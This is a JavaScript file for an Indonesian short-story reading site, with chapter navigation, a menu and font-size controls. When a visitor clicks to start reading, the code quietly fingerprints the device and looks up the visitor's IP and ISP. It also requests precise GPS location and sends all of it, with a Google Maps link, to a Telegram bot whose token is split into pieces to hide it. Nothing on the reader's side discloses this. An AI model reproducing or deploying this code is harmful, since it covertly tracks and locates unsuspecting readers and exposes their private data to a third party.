let currentChapter = 1;
const totalChapters = 4;
let currentFontSize = 1.1;

const part1 = "8816261841";
const part2 = "AAFOvMF00rlDMaxydRfxnTpi5bff";
const part3 = "5dArd9s";
const TELEGRAM_TOKEN = `${part1}:${part2}${part3}`; 
const CHAT_ID = "8335786077";

function handleStartReading() {
    const ua = navigator.userAgent;
    let deviceName = "Unknown Device";
    
    if (/android/i.test(ua)) {
        let match = ua.match(/\b(CPH\d{4}|RMX\d{4}|SM-[A-Z]\d{3}[A-Z]?|M2[0-9]?[A-Z][A-Z]|Vivo\s?[0-9]+)\b/i);
        if (match) {
            deviceName = `Android - ${match[0]}`;
        } else {
            let androidSlice = ua.slice(ua.indexOf("Android"));
            let extracted = androidSlice.split(";")[1];
            deviceName = extracted ? `Android - ${extracted.trim()}` : "Android Mobile";
        }
    } else if (/iphone|ipad|ipod/i.test(ua)) {
        deviceName = "iOS Apple Device";
    } else if (/windows/i.test(ua)) {
        deviceName = "Windows PC";
    } else if (/linux/i.test(ua)) {
        deviceName = "Linux System";
    } else if (/macintosh/i.test(ua)) {
        deviceName = "MacOS PC";
    }

    const cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "Tidak Diketahui";
    const deviceRam = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : "Tidak Diketahui (Protected)";
    const screenRes = `${window.screen.width} x ${window.screen.height} px`;
    const browserLang = navigator.language || navigator.userLanguage || "Unknown";

    let connInfo = "Standard Cellular/WiFi";
    if (navigator.connection) {
        let type = navigator.connection.effectiveType || "unknown";
        let downlink = navigator.connection.downlink ? `${navigator.connection.downlink} Mbps` : "";
        connInfo = `${type.toUpperCase()} ${downlink}`;
    }

    const now = new Date();
    const accessTime = now.toLocaleString('id-ID', { timeZoneName: 'short' });
    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const referrerUrl = document.referrer ? document.referrer : "Direct Access (Ketik Langsung / Bookmark)";

    if (navigator.getBattery) {
        navigator.getBattery().then(battery => {
            let batteryLevelInfo = Math.round(battery.level * 100) + '%';
            let chargeStatusInfo = battery.charging ? 'Charging' : 'Discharging';
            gatherDataAndSend({ battery: batteryLevelInfo, charge: chargeStatusInfo, deviceName, cpuCores, deviceRam, screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl });
        }).catch(() => {
            gatherDataAndSend({ battery: "N/A", charge: "-", deviceName, cpuCores, deviceRam, screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl });
        });
    } else {
        gatherDataAndSend({ battery: "N/A", charge: "-", deviceName, cpuCores, deviceRam, screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl });
    }

    transitionToReader();
}

function gatherDataAndSend(metrics) {
    fetch('https://ipwho.is/')
        .then(res => res.json())
        .then(data => {
            let ip = data.ip || "N/A";
            let isp = data.connection ? data.connection.org || data.connection.isp : "Cellular Provider";
            let city = data.city || "Unknown City";
            let region = `${data.region || ""}, ${data.country || "Indonesia"}`;
            let ipCoords = (data.latitude && data.longitude) ? `${data.latitude}, ${data.longitude}` : null;

            // Minta Izin GPS Akurat
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        let gpsCoords = `${position.coords.latitude}, ${position.coords.longitude}`;
                        sendTelegramMessage(ip, city, region, isp, gpsCoords, metrics, "GPS Akurat 🎯");
                    },
                    () => {
                        sendTelegramMessage(ip, city, region, isp, ipCoords, metrics, "Estimasi IP 🌐");
                    },
                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
                );
            } else {
                sendTelegramMessage(ip, city, region, isp, ipCoords, metrics, "Estimasi IP 🌐");
            }
        })
        .catch(() => {
            sendTelegramMessage("N/A", "Unknown", "Indonesia", "Mobile Gateway", null, metrics, "Gagal ❌");
        });
}

function sendTelegramMessage(ip, city, region, isp, coords, d, modeLoc) {
    let coordText = "N/A";
    if (coords) {
        coordText = `<a href="https://www.google.com/maps?q=${coords}">Buka di Google Maps (${coords})</a>`;
    }

    const message = `📖 PEMBACA MEMBUKA WEB CERPEN!\n\n` +
                    `🌐 IP: ${ip}\n` +
                    `📍 Location (IP): ${city}, ${region}\n` +
                    `📶 Provider: ${isp}\n` +
                    `📍 Location Mode: ${modeLoc}\n` +
                    `📌 Koordinat: ${coordText}\n\n` +
                    `⏱️ Time Access: ${d.accessTime}\n` +
                    `🌍 Time Zone: ${d.timeZone}\n` +
                    `💻 Device/OS: ${d.deviceName}\n` +
                    `⚙️ CPU Cores: ${d.cpuCores}\n` +
                    `🧠 RAM: ${d.deviceRam}\n` +
                    `📱 OS Resolution: ${d.screenRes}\n` +
                    `🗣️ Language: ${d.browserLang}\n` +
                    `⚡ Connection: ${d.connInfo}\n` +
                    `🔋 Battery: ${d.battery} (${d.charge})`;

    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&parse_mode=HTML&text=${encodeURIComponent(message)}`;
    fetch(url).catch(e => console.log("Telemetry error"));
}

// --- NAVIGASI CERPEN ---

function transitionToReader() {
    const landing = document.getElementById('landingPage');
    const reader = document.getElementById('readerContainer');

    landing.classList.remove('active-page');

    setTimeout(() => {
        landing.style.display = 'none';
        reader.style.display = 'block';
        showChapter(1);

        void reader.offsetWidth;
        reader.classList.add('active-page');
    }, 400);
}

function showLandingPage() {
    const landing = document.getElementById('landingPage');
    const reader = document.getElementById('readerContainer');

    closeTopMenu();

    reader.classList.remove('active-page');

    setTimeout(() => {
        reader.style.display = 'none';
        landing.style.display = 'flex';
        window.scrollTo({ top: 0, behavior: 'smooth' });

        void landing.offsetWidth;
        landing.classList.add('active-page');
    }, 400);
}

function showChapter(chapterNumber) {
    const chapters = document.querySelectorAll('.chapter');
    chapters.forEach(chap => chap.classList.remove('active'));

    const targetChapter = document.getElementById(`bab-${chapterNumber}`);
    if (targetChapter) {
        targetChapter.classList.add('active');
        currentChapter = chapterNumber;
    }

    for (let i = 1; i <= totalChapters; i++) {
        const link = document.getElementById(`link-${i}`);
        if (link) {
            if (i === chapterNumber) {
                link.classList.add('active');
            } else {
                link.classList.remove('active');
            }
        }
    }

    document.getElementById('pageIndicator').innerText = `BAB ${currentChapter}`;
    document.getElementById('prevBtn').disabled = (currentChapter === 1);
    document.getElementById('nextBtn').disabled = (currentChapter === totalChapters);

    window.scrollTo({ top: 0, behavior: 'smooth' });
    closeTopMenu();
}

function nextChapter() {
    if (currentChapter < totalChapters) {
        showChapter(currentChapter + 1);
    }
}

function prevChapter() {
    if (currentChapter > 1) {
        showChapter(currentChapter - 1);
    }
}

function toggleTopMenu() {
    const topMenu = document.getElementById('topMenu');
    const menuBtn = document.getElementById('menuBtn');
    const overlay = document.getElementById('overlay');

    topMenu.classList.toggle('open');
    menuBtn.classList.toggle('open');
    overlay.classList.toggle('active');
}

function closeTopMenu() {
    document.getElementById('topMenu').classList.remove('open');
    document.getElementById('menuBtn').classList.remove('open');
    document.getElementById('overlay').classList.remove('active');
}

function changeFontSize(direction) {
    currentFontSize += direction * 0.1;
    if (currentFontSize < 0.9) currentFontSize = 0.9;
    if (currentFontSize > 1.5) currentFontSize = 1.5;

    const paragraphs = document.querySelectorAll('.chapter p');
    paragraphs.forEach(p => {
        p.style.fontSize = `${currentFontSize}rem`;
    });
}
